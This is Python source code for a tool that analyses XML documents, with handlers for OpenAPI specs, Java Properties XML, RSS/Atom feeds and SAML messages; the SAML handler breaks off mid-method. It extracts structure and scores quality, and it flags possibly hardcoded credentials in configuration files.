        for path_elem in paths_elem:
            if path_elem.tag.startswith('{'):
                continue
                
            path = path_elem.tag
            
            for method in http_methods:
                op_elem = path_elem.find(f'.//{method}')
                if op_elem is not None:
                    endpoints.append({
                        'path': path,
                        'method': method.upper(),
                        'operation_id': self._get_child_text(op_elem, 'operationId'),
                        'summary': self._get_child_text(op_elem, 'summary'),
                        'deprecated': self._get_child_text(op_elem, 'deprecated') == 'true'
                    })
        
        return endpoints
    
    def _extract_request_schemas(self, root: ET.Element, is_openapi3: bool) -> List[Dict[str, Any]]:
        """Extract request body schemas"""
        request_schemas = []
        paths_elem = root.find('.//paths')
        
        if paths_elem is None:
            return request_schemas
        
        for path_elem in paths_elem:
            if path_elem.tag.startswith('{'):
                continue
                
            path = path_elem.tag
            
            for method in ['post', 'put', 'patch']:
                op_elem = path_elem.find(f'.//{method}')
                if op_elem is not None:
                    if is_openapi3:
                        # OpenAPI 3.x request body
                        req_body = op_elem.find('.//requestBody')
                        if req_body is not None:
                            content = req_body.find('.//content')
                            if content is not None:
                                for media_type in content:
                                    if not media_type.tag.startswith('{'):
                                        schema_ref = media_type.find('.//schema/$ref')
                                        if schema_ref is not None:
                                            request_schemas.append({
                                                'path': path,
                                                'method': method.upper(),
                                                'media_type': media_type.tag,
                                                'schema_ref': schema_ref.text
                                            })
                    else:
                        # Swagger 2.0 parameters
                        for param in op_elem.findall('.//parameters/parameter'):
                            if self._get_child_text(param, 'in') == 'body':
                                schema_elem = param.find('.//schema')
                                if schema_elem is not None:
                                    request_schemas.append({
                                        'path': path,
                                        'method': method.upper(),
                                        'name': self._get_child_text(param, 'name'),
                                        'required': self._get_child_text(param, 'required') == 'true'
                                    })
        
        return request_schemas[:20]  # Limit
    
    def _extract_response_schemas(self, root: ET.Element, is_openapi3: bool) -> List[Dict[str, Any]]:
        """Extract response schemas"""
        response_schemas = []
        paths_elem = root.find('.//paths')
        
        if paths_elem is None:
            return response_schemas
        
        for path_elem in paths_elem:
            if path_elem.tag.startswith('{'):
                continue
                
            path = path_elem.tag
            
            for op_elem in path_elem:
                if op_elem.tag.startswith('{') or op_elem.tag not in ['get', 'post', 'put', 'delete', 'patch']:
                    continue
                
                method = op_elem.tag
                responses = op_elem.find('.//responses')
                
                if responses is not None:
                    for response in responses:
                        if not response.tag.startswith('{'):
                            status_code = response.tag
                            
                            if is_openapi3:
                                content = response.find('.//content')
                                if content is not None:
                                    for media_type in content:
                                        if not media_type.tag.startswith('{'):
                                            response_schemas.append({
                                                'path': path,
                                                'method': method.upper(),
                                                'status_code': status_code,
                                                'media_type': media_type.tag
                                            })
                            else:
                                schema = response.find('.//schema')
                                if schema is not None:
                                    response_schemas.append({
                                        'path': path,
                                        'method': method.upper(),
                                        'status_code': status_code,
                                        'description': self._get_child_text(response, 'description')
                                    })
        
        return response_schemas[:20]  # Limit
    
    def _extract_auth_methods(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract authentication methods"""
        auth_methods = []
        
        # From security schemes
        security = self._analyze_security(root)
        for scheme in security['schemes']:
            auth_methods.append({
                'name': scheme['name'],
                'type': scheme['type'],
                'description': f"{scheme['type']} authentication"
            })
        
        return auth_methods
    
    def _get_child_text(self, parent: ET.Element, child_name: str, default: str = None) -> Optional[str]:
        """Get text content of a child element"""
        child = parent.find(f'.//{child_name}')
        return child.text if child is not None else default
    
    def _assess_api_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess API specification quality"""
        # Documentation completeness
        total_ops = findings['operations']['total']
        doc_score = 0.0
        
        if total_ops > 0:
            # Check if operations have summaries (would need more detailed analysis)
            doc_score = 0.7  # Placeholder
        
        # Security implementation
        security_score = 0.0
        if findings['security']['schemes']:
            security_score = min(len(findings['security']['schemes']) * 0.3, 1.0)
        
        # API organization (tags)
        org_score = 0.0
        if findings['tags']:
            org_score = min(len(findings['tags']) * 0.2, 1.0)
        
        # Deprecation management
        deprecation_score = 1.0
        if findings['operations']['deprecated']:
            deprecation_ratio = len(findings['operations']['deprecated']) / max(total_ops, 1)
            deprecation_score = max(0, 1.0 - deprecation_ratio * 2)  # Penalize heavily
        
        # Schema coverage
        schema_score = min(len(findings['schemas']) / 10, 1.0)  # Assume 10+ schemas is good
        
        return {
            "documentation": doc_score,
            "security": security_score,
            "organization": org_score,
            "deprecation_management": deprecation_score,
            "schema_coverage": schema_score,
            "overall": (doc_score + security_score + org_score + deprecation_score + schema_score) / 5
        }
</file>

<file path="src/handlers/properties_xml_handler.py">
#!/usr/bin/env python3
"""
Properties XML Handler

Handles Java Properties files in XML format.
These are commonly used for configuration in Java applications
and provide a structured alternative to traditional .properties files.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class PropertiesXMLHandler(XMLHandler):
    """Handler for Java Properties XML files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Java Properties XML files have specific DTD
        if root.tag == 'properties' or root.tag.endswith('}properties'):
            # Check for properties-specific structure
            if root.find('.//entry') is not None:
                return True, 1.0
            # Even without entries, if it has the comment element typical of properties
            if root.find('.//comment') is not None:
                return True, 0.8
            # Basic properties root
            return True, 0.6
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Properties XML files typically reference a specific DTD
        dtd_version = "1.0"  # Standard version
        
        # Check for comment that might indicate version or purpose
        comment = root.find('.//comment')
        comment_text = comment.text if comment is not None else None
        
        return DocumentTypeInfo(
            type_name="Java Properties XML",
            confidence=1.0,
            version=dtd_version,
            schema_uri="http://java.sun.com/dtd/properties.dtd",
            metadata={
                "standard": "Java Properties",
                "category": "configuration",
                "format": "XML",
                "comment": comment_text
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'properties': self._extract_all_properties(root),
            'property_groups': self._group_properties_by_prefix(root),
            'environment_configs': self._detect_environment_configs(root),
            'security_sensitive': self._find_sensitive_properties(root),
            'placeholders': self._find_placeholders(root),
            'duplicates': self._find_duplicate_keys(root),
            'statistics': self._calculate_statistics(root)
        }
        
        recommendations = [
            "Review for hardcoded sensitive values",
            "Check for environment-specific configurations",
            "Validate property naming conventions",
            "Extract for configuration management",
            "Monitor for configuration drift",
            "Consider encrypting sensitive properties"
        ]
        
        ai_use_cases = [
            "Configuration validation",
            "Security scanning for exposed credentials",
            "Environment configuration comparison",
            "Property dependency analysis",
            "Configuration migration assistance",
            "Default value recommendations",
            "Configuration documentation generation",
            "Property usage analysis"
        ]
        
        return SpecializedAnalysis(
            document_type="Java Properties Configuration",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_properties': len(findings['properties']),
                'property_groups': len(findings['property_groups']),
                'sensitive_properties': len(findings['security_sensitive']),
                'placeholders': len(findings['placeholders'])
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_property_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'all_properties': self._extract_properties_dict(root),
            'grouped_properties': self._extract_grouped_properties(root),
            'configuration_metadata': self._extract_metadata(root),
            'property_patterns': self._analyze_property_patterns(root)
        }
    
    def _extract_all_properties(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract all properties with their details"""
        properties = []
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            if key:
                prop_info = {
                    'key': key,
                    'value': entry.text or '',
                    'type': self._infer_property_type(entry.text),
                    'category': self._categorize_property(key),
                    'is_empty': not entry.text or not entry.text.strip()
                }
                
                # Check for special patterns
                if prop_info['value']:
                    prop_info['has_placeholder'] = '${' in prop_info['value'] or '#{' in prop_info['value']
                    prop_info['is_reference'] = prop_info['value'].startswith('@') or prop_info['value'].startswith('$')
                else:
                    prop_info['has_placeholder'] = False
                    prop_info['is_reference'] = False
                
                properties.append(prop_info)
        
        # Sort by key for consistency
        properties.sort(key=lambda x: x['key'])
        
        return properties
    
    def _group_properties_by_prefix(self, root: ET.Element) -> Dict[str, List[Dict[str, str]]]:
        """Group properties by their prefix (e.g., 'database.', 'server.', etc.)"""
        groups = {}
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            if key and '.' in key:
                prefix = key.split('.')[0]
                if prefix not in groups:
                    groups[prefix] = []
                
                groups[prefix].append({
                    'key': key,
                    'value': entry.text or '',
                    'suffix': '.'.join(key.split('.')[1:])
                })
        
        return groups
    
    def _detect_environment_configs(self, root: ET.Element) -> Dict[str, List[str]]:
        """Detect environment-specific configurations"""
        env_configs = {
            'development': [],
            'testing': [],
            'staging': [],
            'production': []
        }
        
        env_patterns = {
            'development': ['dev', 'development', 'local', 'debug'],
            'testing': ['test', 'testing', 'qa', 'quality'],
            'staging': ['stage', 'staging', 'uat', 'preprod'],
            'production': ['prod', 'production', 'live', 'release']
        }
        
        for entry in root.findall('.//entry'):
            key = entry.get('key', '').lower()
            value = (entry.text or '').lower()
            
            for env, patterns in env_patterns.items():
                if any(pattern in key or pattern in value for pattern in patterns):
                    env_configs[env].append(entry.get('key'))
        
        # Remove duplicates
        for env in env_configs:
            env_configs[env] = list(set(env_configs[env]))
        
        return env_configs
    
    def _find_sensitive_properties(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Find potentially sensitive properties"""
        sensitive_properties = []
        
        sensitive_patterns = [
            'password', 'passwd', 'pwd', 'secret', 'key', 'token',
            'credential', 'auth', 'private', 'certificate', 'cert',
            'api_key', 'apikey', 'access_key', 'encryption'
        ]
        
        for entry in root.findall('.//entry'):
            key = entry.get('key', '').lower()
            value = entry.text or ''
            
            # Check if key contains sensitive patterns
            is_sensitive = any(pattern in key for pattern in sensitive_patterns)
            
            if is_sensitive:
                sensitive_info = {
                    'key': entry.get('key'),
                    'value_length': len(value),
                    'is_encrypted': self._looks_encrypted(value),
                    'is_empty': not value,
                    'is_placeholder': '${' in value or value.startswith('ENC('),
                    'risk_level': self._assess_risk_level(key, value)
                }
                
                # Don't include actual value for security
                if not sensitive_info['is_empty'] and not sensitive_info['is_placeholder']:
                    sensitive_info['value_preview'] = value[:3] + '***' if len(value) > 3 else '***'
                
                sensitive_properties.append(sensitive_info)
        
        return sensitive_properties
    
    def _find_placeholders(self, root: ET.Element) -> List[Dict[str, str]]:
        """Find properties with placeholder values"""
        placeholders = []
        
        placeholder_patterns = [
            (r'\$\{([^}]+)\}', 'maven_style'),  # ${property}
            (r'#\{([^}]+)\}', 'spring_el'),     # #{expression}
            (r'@([^@]+)@', 'ant_style'),        # @property@
            (r'%\(([^)]+)\)s?', 'python_style') # %(property)s
        ]
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            value = entry.text or ''
            
            for pattern, style in placeholder_patterns:
                matches = re.findall(pattern, value)
                if matches:
                    placeholders.append({
                        'key': key,
                        'value': value,
                        'placeholders': matches,
                        'style': style
                    })
                    break
        
        return placeholders
    
    def _find_duplicate_keys(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Find duplicate property keys"""
        key_occurrences = {}
        duplicates = []
        
        for i, entry in enumerate(root.findall('.//entry')):
            key = entry.get('key')
            if key:
                if key not in key_occurrences:
                    key_occurrences[key] = []
                key_occurrences[key].append({
                    'index': i,
                    'value': entry.text or ''
                })
        
        for key, occurrences in key_occurrences.items():
            if len(occurrences) > 1:
                duplicates.append({
                    'key': key,
                    'occurrences': len(occurrences),
                    'values': [occ['value'] for occ in occurrences],
                    'all_same': len(set(occ['value'] for occ in occurrences)) == 1
                })
        
        return duplicates
    
    def _calculate_statistics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate property statistics"""
        all_entries = root.findall('.//entry')
        
        stats = {
            'total_properties': len(all_entries),
            'empty_properties': 0,
            'property_types': {},
            'key_lengths': {'min': 0, 'max': 0, 'avg': 0},
            'value_lengths': {'min': 0, 'max': 0, 'avg': 0},
            'naming_patterns': {}
        }
        
        key_lengths = []
        value_lengths = []
        
        for entry in all_entries:
            key = entry.get('key', '')
            value = entry.text or ''
            
            # Count empty properties
            if not value.strip():
                stats['empty_properties'] += 1
            
            # Track lengths
            key_lengths.append(len(key))
            value_lengths.append(len(value))
            
            # Analyze property types
            prop_type = self._infer_property_type(value)
            stats['property_types'][prop_type] = stats['property_types'].get(prop_type, 0) + 1
            
            # Analyze naming patterns
            pattern = self._analyze_naming_pattern(key)
            stats['naming_patterns'][pattern] = stats['naming_patterns'].get(pattern, 0) + 1
        
        # Calculate length statistics
        if key_lengths:
            stats['key_lengths'] = {
                'min': min(key_lengths),
                'max': max(key_lengths),
                'avg': sum(key_lengths) / len(key_lengths)
            }
        
        if value_lengths:
            stats['value_lengths'] = {
                'min': min(value_lengths),
                'max': max(value_lengths),
                'avg': sum(value_lengths) / len(value_lengths)
            }
        
        return stats
    
    def _infer_property_type(self, value: str) -> str:
        """Infer the type of a property value"""
        if not value:
            return 'empty'
        
        value = value.strip()
        
        # Boolean
        if value.lower() in ['true', 'false', 'yes', 'no', 'on', 'off', '1', '0']:
            return 'boolean'
        
        # Numeric
        try:
            int(value)
            return 'integer'
        except ValueError:
            try:
                float(value)
                return 'float'
            except ValueError:
                pass
        
        # URL/URI
        if value.startswith(('http://', 'https://', 'ftp://', 'file://', 'jdbc:')):
            return 'url'
        
        # File path
        if '/' in value or '\\' in value or value.endswith(('.xml', '.properties', '.conf')):
            return 'path'
        
        # Email
        if '@' in value and '.' in value.split('@')[-1]:
            return 'email'
        
        # Class name (Java)
        if '.' in value and value[0].isupper() and not ' ' in value:
            return 'classname'
        
        # List/Array
        if ',' in value or ';' in value:
            return 'list'
        
        # Placeholder
        if '${' in value or '#{' in value:
            return 'placeholder'
        
        return 'string'
    
    def _categorize_property(self, key: str) -> str:
        """Categorize property based on its key"""
        key_lower = key.lower()
        
        categories = {
            'database': ['db', 'database', 'jdbc', 'datasource', 'sql'],
            'server': ['server', 'host', 'port', 'url', 'endpoint'],
            'security': ['password', 'secret', 'key', 'token', 'auth', 'credential'],
            'logging': ['log', 'logger', 'logging', 'debug'],
            'performance': ['cache', 'pool', 'timeout', 'max', 'min', 'size'],
            'feature': ['enable', 'disable', 'feature', 'flag'],
            'path': ['path', 'dir', 'directory', 'file', 'location'],
            'network': ['proxy', 'network', 'connection', 'socket']
        }
        
        for category, keywords in categories.items():
            if any(keyword in key_lower for keyword in keywords):
                return category
        
        return 'general'
    
    def _looks_encrypted(self, value: str) -> bool:
        """Check if a value looks like it might be encrypted"""
        if not value:
            return False
        
        # Common encryption markers
        if value.startswith(('ENC(', 'ENCRYPTED(', '{cipher}')):
            return True
        
        # Base64-like pattern (long string with specific characters)
        if len(value) > 20 and re.match(r'^[A-Za-z0-9+/=]+$', value):
            return True
        
        # Hex-like pattern
        if len(value) > 20 and re.match(r'^[0-9a-fA-F]+$', value):
            return True
        
        return False
    
    def _assess_risk_level(self, key: str, value: str) -> str:
        """Assess the risk level of a sensitive property"""
        if not value:
            return 'low'  # Empty is low risk
        
        if '${' in value or value.startswith('ENC('):
            return 'low'  # Placeholder or encrypted
        
        if self._looks_encrypted(value):
            return 'medium'  # Encrypted but still present
        
        # High risk patterns
        high_risk_keywords = ['password', 'secret', 'private', 'key']
        if any(keyword in key.lower() for keyword in high_risk_keywords) and len(value) > 3:
            return 'high'
        
        return 'medium'
    
    def _analyze_naming_pattern(self, key: str) -> str:
        """Analyze the naming pattern of a property key"""
        if not key:
            return 'empty'
        
        # Dot notation (most common in Java)
        if '.' in key:
            parts = key.split('.')
            if all(part.islower() for part in parts):
                return 'dot.lowercase'
            elif all(part[0].isupper() for part in parts if part):
                return 'dot.PascalCase'
            else:
                return 'dot.mixed'
        
        # Underscore notation
        if '_' in key:
            if key.isupper():
                return 'CONSTANT_CASE'
            elif key.islower():
                return 'snake_case'
            else:
                return 'mixed_underscore'
        
        # Hyphen notation
        if '-' in key:
            return 'kebab-case'
        
        # Camel case
        if key[0].islower() and any(c.isupper() for c in key[1:]):
            return 'camelCase'
        
        # Pascal case
        if key[0].isupper() and any(c.islower() for c in key):
            return 'PascalCase'
        
        # Simple lowercase
        if key.islower():
            return 'lowercase'
        
        # Simple uppercase
        if key.isupper():
            return 'UPPERCASE'
        
        return 'other'
    
    def _extract_properties_dict(self, root: ET.Element) -> Dict[str, str]:
        """Extract properties as a simple key-value dictionary"""
        properties = {}
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            if key:
                properties[key] = entry.text or ''
        
        return properties
    
    def _extract_grouped_properties(self, root: ET.Element) -> Dict[str, Dict[str, str]]:
        """Extract properties grouped by prefix"""
        grouped = {}
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            if key and '.' in key:
                prefix = key.split('.')[0]
                if prefix not in grouped:
                    grouped[prefix] = {}
                
                # Use the rest of the key as the property name
                prop_name = '.'.join(key.split('.')[1:])
                grouped[prefix][prop_name] = entry.text or ''
        
        return grouped
    
    def _extract_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract metadata about the properties file"""
        metadata = {}
        
        # Extract comment if present
        comment = root.find('.//comment')
        if comment is not None and comment.text:
            metadata['comment'] = comment.text.strip()
            
            # Try to extract metadata from comment
            # Look for common patterns like version, date, author
            comment_text = comment.text.lower()
            
            # Version
            version_match = re.search(r'version[:\s]+([0-9.]+)', comment_text)
            if version_match:
                metadata['version'] = version_match.group(1)
            
            # Date
            date_match = re.search(r'date[:\s]+([0-9/-]+)', comment_text)
            if date_match:
                metadata['date'] = date_match.group(1)
            
            # Author
            author_match = re.search(r'author[:\s]+([^\n]+)', comment_text)
            if author_match:
                metadata['author'] = author_match.group(1).strip()
        
        # Count total entries
        metadata['total_entries'] = len(root.findall('.//entry'))
        
        return metadata
    
    def _analyze_property_patterns(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze patterns in property definitions"""
        patterns = {
            'hierarchical_groups': {},
            'common_prefixes': {},
            'common_suffixes': {},
            'value_patterns': {}
        }
        
        all_keys = []
        
        for entry in root.findall('.//entry'):
            key = entry.get('key')
            if key:
                all_keys.append(key)
                
                # Analyze hierarchical structure
                if '.' in key:
                    parts = key.split('.')
                    for i in range(1, len(parts)):
                        prefix = '.'.join(parts[:i])
                        patterns['hierarchical_groups'][prefix] = patterns['hierarchical_groups'].get(prefix, 0) + 1
        
        # Find common prefixes (first part before delimiter)
        for key in all_keys:
            if '.' in key:
                prefix = key.split('.')[0]
                patterns['common_prefixes'][prefix] = patterns['common_prefixes'].get(prefix, 0) + 1
            elif '_' in key:
                prefix = key.split('_')[0]
                patterns['common_prefixes'][prefix] = patterns['common_prefixes'].get(prefix, 0) + 1
        
        # Find common suffixes (last part after delimiter)
        for key in all_keys:
            if '.' in key:
                suffix = key.split('.')[-1]
                patterns['common_suffixes'][suffix] = patterns['common_suffixes'].get(suffix, 0) + 1
            elif '_' in key:
                suffix = key.split('_')[-1]
                patterns['common_suffixes'][suffix] = patterns['common_suffixes'].get(suffix, 0) + 1
        
        # Limit results to most common
        patterns['common_prefixes'] = dict(sorted(patterns['common_prefixes'].items(), 
                                                key=lambda x: x[1], reverse=True)[:10])
        patterns['common_suffixes'] = dict(sorted(patterns['common_suffixes'].items(), 
                                                key=lambda x: x[1], reverse=True)[:10])
        
        return patterns
    
    def _assess_property_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess the quality of the properties configuration"""
        # Completeness (fewer empty properties is better)
        empty_ratio = findings['statistics']['empty_properties'] / max(findings['statistics']['total_properties'], 1)
        completeness = max(0, 1.0 - empty_ratio)
        
        # Security (fewer exposed sensitive values is better)
        security_score = 1.0
        high_risk_count = sum(1 for prop in findings['security_sensitive'] 
                            if prop.get('risk_level') == 'high')
        if high_risk_count > 0:
            security_score = max(0, 1.0 - (high_risk_count * 0.2))  # -0.2 per high risk
        
        # Organization (good use of hierarchical naming)
        organization = 0.0
        if findings['property_groups']:
            # More groups indicate better organization
            organization = min(len(findings['property_groups']) / 10, 1.0)
        
        # Consistency (no duplicates is better)
        consistency = 1.0 if not findings['duplicates'] else 0.5
        
        # Best practices (use of placeholders for environment-specific values)
        best_practices = 0.0
        if findings['placeholders']:
            # Having placeholders for configuration is good
            placeholder_ratio = len(findings['placeholders']) / max(findings['statistics']['total_properties'], 1)
            best_practices = min(placeholder_ratio * 5, 1.0)  # Up to 20% placeholders is good
        
        return {
            "completeness": completeness,
            "security": security_score,
            "organization": organization,
            "consistency": consistency,
            "best_practices": best_practices,
            "overall": (completeness + security_score + organization + consistency + best_practices) / 5
        }
</file>

<file path="src/handlers/rss_handler.py">
#!/usr/bin/env python3
"""
RSS/Atom Feed Handler

Analyzes RSS and Atom feed documents for content syndication,
news aggregation, and content distribution systems.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class RSSHandler(XMLHandler):
    """Handler for RSS feed documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        if root.tag == 'rss' or root.tag.endswith('}rss'):
            return True, 1.0
        if root.tag == 'feed':  # Atom feeds
            return True, 0.9
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        version = root.get('version', '2.0')
        feed_type = 'RSS' if root.tag.endswith('rss') else 'Atom'
        
        return DocumentTypeInfo(
            type_name=f"{feed_type} Feed",
            confidence=1.0,
            version=version,
            metadata={
                "standard": feed_type,
                "category": "content_syndication"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        channel = root.find('.//channel') or root
        items = root.findall('.//item') or root.findall('.//{http://www.w3.org/2005/Atom}entry')
        
        findings = {
            'total_items': len(items),
            'has_descriptions': sum(1 for item in items if item.find('.//description') is not None),
            'has_dates': sum(1 for item in items if item.find('.//pubDate') is not None),
            'categories': self._extract_categories(items)
        }
        
        recommendations = [
            "Use for content aggregation and analysis",
            "Extract for trend analysis and topic modeling",
            "Monitor for content updates and changes"
        ]
        
        ai_use_cases = [
            "Content categorization and tagging",
            "Trend detection and analysis",
            "Sentiment analysis on articles",
            "Topic modeling and clustering",
            "Content recommendation systems"
        ]
        
        return SpecializedAnalysis(
            document_type="RSS/Atom Feed",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={'articles': len(items), 'categories': len(findings['categories'])},
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_feed_quality(root, items)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        items = root.findall('.//item') or root.findall('.//{http://www.w3.org/2005/Atom}entry')
        
        return {
            'feed_metadata': self._extract_feed_metadata(root),
            'items': [self._extract_item_data(item) for item in items[:10]]  # First 10 items
        }
    
    def _extract_categories(self, items) -> List[str]:
        categories = set()
        for item in items:
            for cat in item.findall('.//category'):
                if cat.text:
                    categories.add(cat.text)
        return list(categories)
    
    def _extract_feed_metadata(self, root: ET.Element) -> Dict[str, Any]:
        channel = root.find('.//channel') or root
        return {
            'title': getattr(channel.find('.//title'), 'text', None),
            'description': getattr(channel.find('.//description'), 'text', None),
            'link': getattr(channel.find('.//link'), 'text', None)
        }
    
    def _extract_item_data(self, item: ET.Element) -> Dict[str, Any]:
        return {
            'title': getattr(item.find('.//title'), 'text', None),
            'description': getattr(item.find('.//description'), 'text', None),
            'pubDate': getattr(item.find('.//pubDate'), 'text', None),
            'link': getattr(item.find('.//link'), 'text', None)
        }
    
    def _calculate_feed_quality(self, root: ET.Element, items: List[ET.Element]) -> Dict[str, float]:
        total = len(items)
        if total == 0:
            return {"completeness": 0.0, "consistency": 0.0, "data_density": 0.0}
        
        with_desc = sum(1 for item in items if item.find('.//description') is not None)
        with_date = sum(1 for item in items if item.find('.//pubDate') is not None)
        
        return {
            "completeness": (with_desc + with_date) / (2 * total),
            "consistency": 1.0 if with_desc == total else with_desc / total,
            "data_density": 0.8  # Typical for RSS feeds
        }
</file>

<file path="src/handlers/saml_handler.py">
#!/usr/bin/env python3
"""
SAML Handler

Analyzes SAML (Security Assertion Markup Language) assertions, responses, and requests
for security analysis, SSO configuration validation, and identity management.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os
from datetime import datetime

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SAMLHandler(XMLHandler):
    """Handler for SAML assertions, responses, and requests"""
    
    # SAML namespace URIs
    SAML_20_ASSERTION_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
    SAML_20_PROTOCOL_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
    SAML_11_ASSERTION_NS = "urn:oasis:names:tc:SAML:1.0:assertion"
    SAML_11_PROTOCOL_NS = "urn:oasis:names:tc:SAML:1.0:protocol"
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for SAML root elements
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Common SAML root elements
        saml_roots = ['Assertion', 'Response', 'AuthnRequest', 'LogoutRequest', 'LogoutResponse']
        
        if root_tag in saml_roots:
            confidence = 0.0
            
            # Check for SAML namespaces in root tag
            if root.tag.startswith('{'):
                root_namespace = root.tag.split('}')[0][1:]
                if any(saml_ns in root_namespace for saml_ns in [
                    self.SAML_20_ASSERTION_NS, self.SAML_20_PROTOCOL_NS,
                    self.SAML_11_ASSERTION_NS, self.SAML_11_PROTOCOL_NS
                ]):
                    confidence += 0.7
            
            # Check declared namespaces
            for uri in namespaces.values():
                if any(saml_ns in uri for saml_ns in [
                    self.SAML_20_ASSERTION_NS, self.SAML_20_PROTOCOL_NS,
                    self.SAML_11_ASSERTION_NS, self.SAML_11_PROTOCOL_NS
                ]):
                    confidence += 0.7
                    break
            
            # Check for typical SAML attributes
            saml_attributes = ['ID', 'IssueInstant', 'Version', 'Issuer']
            attr_matches = sum(1 for attr in saml_attributes if root.get(attr) is not None)
            confidence += attr_matches * 0.1
            
            # Check for common SAML child elements
            common_children = ['Issuer', 'Subject', 'Conditions', 'AttributeStatement', 'AuthnStatement']
            child_matches = sum(1 for child in common_children 
                              if self._find_element_by_local_name(root, child) is not None)
            confidence += child_matches * 0.05
            
            if confidence >= 0.7:
                return True, min(confidence, 1.0)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Determine SAML version
        version = self._get_saml_version(root, namespaces)
        
        # Determine message type
        message_type = self._determine_message_type(root)
        
        # Extract issuer information
        issuer = self._extract_issuer(root)
        
        metadata = {
            "protocol": "SAML",
            "category": "security_assertion",
            "message_type": message_type,
            "issuer": issuer,
            "has_signature": self._has_signature(root),
            "has_encryption": self._has_encryption(root),
            "assertion_count": self._count_assertions(root)
        }
        
        return DocumentTypeInfo(
            type_name=f"SAML {version} {message_type}",
            confidence=0.95,
            version=version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'saml_info': self._analyze_saml_document(root),
            'assertions': self._analyze_assertions(root),
            'subject_info': self._analyze_subject(root),
            'conditions': self._analyze_conditions(root),
            'attributes': self._analyze_attributes(root),
            'authentication': self._analyze_authentication(root),
            'security': self._analyze_security(root),
            'namespaces': self._analyze_namespaces(root),
            'validation_metrics': self._calculate_validation_metrics(root)
        }
        
        recommendations = [
            "Validate digital signatures on all SAML assertions",
            "Check assertion validity periods and conditions",
            "Analyze attribute statements for sensitive data exposure",
            "Verify issuer trust relationships and certificates",
            "Monitor for SAML injection and manipulation attacks",
            "Review authentication context and session management",
            "Analyze for compliance with SAML security profiles",
            "Check encryption requirements for sensitive assertions"
        ]
        
        ai_use_cases = [
            "SAML security analysis and vulnerability assessment",
            "SSO configuration validation and optimization",
            "Identity federation security monitoring",
            "SAML assertion fraud detection",
            "Compliance auditing (SOX, HIPAA, PCI-DSS)",
            "Authentication flow analysis and optimization",
            "Certificate and trust chain validation",
            "SAML protocol attack detection",
            "Identity attribute analysis and privacy protection"
        ]
        
        data_inventory = {
            'assertions': len(findings['assertions']['assertion_details']),
            'attributes': len(findings['attributes']['attribute_statements']),
            'subjects': 1 if findings['subject_info']['has_subject'] else 0,
            'conditions': len(findings['conditions']['condition_types']),
            'signatures': 1 if findings['security']['has_signature'] else 0
        }
        
        return SpecializedAnalysis(
            document_type=f"SAML {findings['saml_info']['version']} {findings['saml_info']['message_type']}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_saml_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'document_metadata': {
                'version': self._get_saml_version(root, {}),
                'type': self._determine_message_type(root),
                'issuer': self._extract_issuer(root),
                'id': root.get('ID'),
                'issue_instant': root.get('IssueInstant')
            },
            'security_summary': self._extract_security_summary(root),
            'subject_summary': self._extract_subject_summary(root),
            'assertion_summary': self._extract_assertion_summary(root),
            'conditions_summary': self._extract_conditions_summary(root)
        }
    
    def _get_saml_version(self, root: ET.Element, namespaces: Dict[str, str]) -> str:
        """Determine SAML version from namespace or version attribute"""
        # Check version attribute first
        version = root.get('Version')
        if version:
            return version
        
        # Check namespace
        if root.tag.startswith('{'):
